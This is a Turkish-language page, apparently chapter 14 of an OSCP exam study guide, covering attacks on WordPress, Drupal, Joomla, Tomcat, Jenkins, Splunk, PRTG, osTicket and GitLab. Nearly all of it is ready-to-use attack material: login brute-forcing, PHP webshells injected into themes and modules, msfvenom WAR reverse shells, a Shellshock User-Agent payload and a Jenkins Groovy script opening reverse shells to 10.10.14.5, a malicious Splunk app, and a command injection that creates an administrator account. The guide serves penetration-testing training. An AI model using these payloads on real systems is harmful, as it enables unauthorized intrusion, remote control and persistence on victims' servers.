---
layout: page
title: "Bölüm 14 — Yaygın Uygulama Saldırıları"
oscp: true
toc: true
permalink: /oscp/14-yaygin-uygulamalar/
---

{% raw %}
Bu bölüm, hazır (off-the-shelf) web uygulamalarına — CMS'ler, uygulama sunucuları
ve yönetim panelleri — saldırıyı kapsar. Kural: **önce ürünü ve sürümü parmak izle,
sonra o sürüme özel bilinen zafiyet/default credential ara.** Çoğu zaman yol
aynıdır: **tanı → sürüm → panele giriş (default/brute) → yönetici yetkisiyle kod
çalıştırma (tema/eklenti/modül/deploy).**

Jenerik web zafiyetleri (SQLi, LFI, upload, XSS) için [Bölüm 2](/oscp/02-web-saldirilari/);
webshell/reverse shell için [Bölüm 13](/oscp/13-shell-payload/).

## 14.1 Keşif & Parmak İzi

```bash
# Web yüzeyini tara + ekran görüntüsü al
nmap -p80,443,8000,8080,8180,8888 --open -oA web_discovery -iL scope.txt
eyewitness --web -x web_discovery.xml -d eyewitness_out
cat web_discovery.xml | ./aquatone -nmap

# Teknoloji/CMS tespiti
whatweb -a3 http://TARGET
curl -IL http://TARGET                 # Server header
```

Hızlı CMS işaretleri: `/robots.txt`, `/CHANGELOG.txt`, `/README.txt`, favicon,
`/wp-content/` (WordPress), `/node/1` (Drupal), `/administrator/` (Joomla).

## 14.2 WordPress

```bash
# Tanı + sürüm/tema/eklenti
curl -s http://blog.inlanefreight.local | grep -iE 'wordpress|themes|plugins'
# Eklenti sürümü: her eklentinin readme'si → bilinen CVE
curl -s http://TARGET/wp-content/plugins/<plugin>/readme.txt

# wpscan (kullanıcı, tema, eklenti, zafiyet)
wpscan --url http://TARGET --enumerate u,t,p
wpscan --url http://TARGET --enumerate --api-token <WPScan_API_TOKEN>

# Login brute (xmlrpc wp-login'den hızlıdır)
wpscan --url http://TARGET --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```

**Admin erişimi → RCE:** Appearance → **Theme Editor** → bir temanın `.php`
dosyasına (`404.php` gibi) `system($_GET["cmd"]);` yaz → Update → tetikle:

```bash
curl 'http://TARGET/wp-content/themes/twentynineteen/404.php?cmd=id'
# Otomatik (kimlikli): msfconsole → use exploit/unix/webapp/wp_admin_shell_upload
```

## 14.3 Drupal

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
curl -s http://TARGET/CHANGELOG.txt | head        # sürüm
```

**Backdoorlu modül ile RCE (admin erişimi):** Drupal `/modules`'a doğrudan erişimi
engellediği için `.htaccess` ile aç:

```bash
# shell.php:  <?php system($_GET['cmd']); ?>
# .htaccess:  <IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\n</IfModule>
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz && mv shell.php .htaccess captcha/
tar cvf captcha.tar.gz captcha/
# Manage → Extend → Install new module → yükle → tetikle:
curl -s http://TARGET/modules/captcha/shell.php?cmd=id
```

> Drupal 7 ve altı için **Drupalgeddon** (SQLi/RCE) zincirlerini `searchsploit drupal`
> ile kontrol et — kimlik doğrulamasız RCE verebilir.

## 14.4 Joomla

```bash
# Sürüm parmak izi
curl -s http://TARGET/README.txt | head -5
curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -
curl -s http://TARGET/plugins/system/cache/cache.xml
droopescan scan joomla --url http://TARGET
perl joomscan.pl -u http://TARGET --enumerate-components

# Admin brute
python3 joomla-brute.py -u http://TARGET \
  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

**Admin → RCE:** Templates → aktif template'in `error.php`/`index.php`'sine PHP
payload ekle → tetikle: `curl -s http://TARGET/templates/protostar/error.php?cmd=id`.

## 14.5 Tomcat

```bash
# Sürüm (Server header gizliyse /docs)
curl -s http://TARGET:8080/docs/ | grep -i tomcat

# Manager paneli brute (RCE'nin kapısı)
msfconsole → use auxiliary/scanner/http/tomcat_mgr_login
#   default liste: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_*.txt

# WAR webshell üret + /manager'dan deploy et
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4443 -f war > shell.war
#   use exploit/multi/http/tomcat_mgr_upload   (otomatik)
```

**CGI Servlet RCE (CVE-2019-0232, Windows):** `/cgi` altındaki `.bat`/`.cmd`
script'leri bul, `&` ile komut enjekte et:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat
# http://TARGET:8080/cgi/welcome.bat?&dir
# Filtre varsa URL-encode: ...?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

> **Ghostcat (CVE-2020-1938):** 8009/tcp (AJP) açıksa dosya okuma/LFI → RCE
> (`searchsploit Ghostcat`). **Shellshock:** `/cgi-bin/` altında `.cgi` script'i
> varsa User-Agent'a `() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/8443 0>&1`.

## 14.6 Jenkins

Script Console'a (`/script`, çoğu zaman kimlik doğrulamasız) erişim = Groovy ile RCE:

```groovy
// Linux komut
def proc = "id".execute(); println proc.text
// Linux reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
// Windows komut
println("cmd.exe /c dir".execute().text)
```

> Otomatik: `exploit/multi/http/jenkins_script_console`. Panel kilitliyse default
> credential (`admin:admin`) ve `/configureSecurity/` kontrol et.

## 14.7 Splunk

Port 8000. Eski sürümde default `admin:changeme`; **60 gün sonra trial → auth'suz
free sürüme** döner (sık görülen açık).

**Kötüye kullanım — zararlı app yükle (bin'deki script çalışır):**

```bash
# reverse_shell_splunk reposundaki yapıyı kullan:
#   splunk_shell/bin/run.ps1 (Windows) veya rev.py (Linux)  +  default/inputs.conf
tar -cvzf updater.tar.gz splunk_shell/
mv updater.tar.gz updater.spl
# Web arayüzü → Install app from file → .spl yükle → script tetiklenir
```

Linux hedefte `rev.py` içindeki IP/port'u düzenle; Windows'ta `run.ps1` PowerShell
reverse shell one-liner'ını kullan ([Bölüm 13](/oscp/13-shell-payload/)).

## 14.8 PRTG Network Monitor

Default `prtgadmin:prtgadmin` (EyeWitness bunu da yakalar). **Authenticated command
injection:** Setup → Account Settings → **Notifications** → yeni bildirim → EXECUTE
PROGRAM → `Demo exe notification - outfile.ps1` seç → Parameter alanına:

```text
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

Save → bildirimi test et. Otomatik: `use exploit/windows/http/prtg_authenticated_rce`.

## 14.9 osTicket & GitLab

**osTicket:** login `/scp/login.php`. `searchsploit osTicket` → sürüme göre SSRF
(CVE-2020-24881), SQLi, arbitrary upload, XSS. SSRF ile iç kaynak/port tarama.

**GitLab:** sürümü sadece giriş yaptıktan sonra `/help`'ten görürsün. `/explore` →
public projelerde sızmış credential/secret ara; `/users/sign_up` ile kullanıcı enum
(CVE için [exploit-db 49821](https://www.exploit-db.com/exploits/49821)). 2FA default
kapalı → OSINT credential'ı dene. GitLab CE ≤ 13.10.2 authenticated RCE (`searchsploit gitlab`).

---

Bir uygulamada kod çalıştırdıktan sonra reverse shell al
([Bölüm 13](/oscp/13-shell-payload/)), TTY yükselt ve
[Bölüm 4/5](/oscp/04-windows-privesc/) ile privesc'e geç. Bulduğun credential'ları
([Bölüm 3](/oscp/03-parola-saldirilari/)) diğer servislerde tekrar dene.

[← Bölüm 13](/oscp/13-shell-payload/) · [Bölüm 15 →](/oscp/15-metasploit/)
{% endraw %}
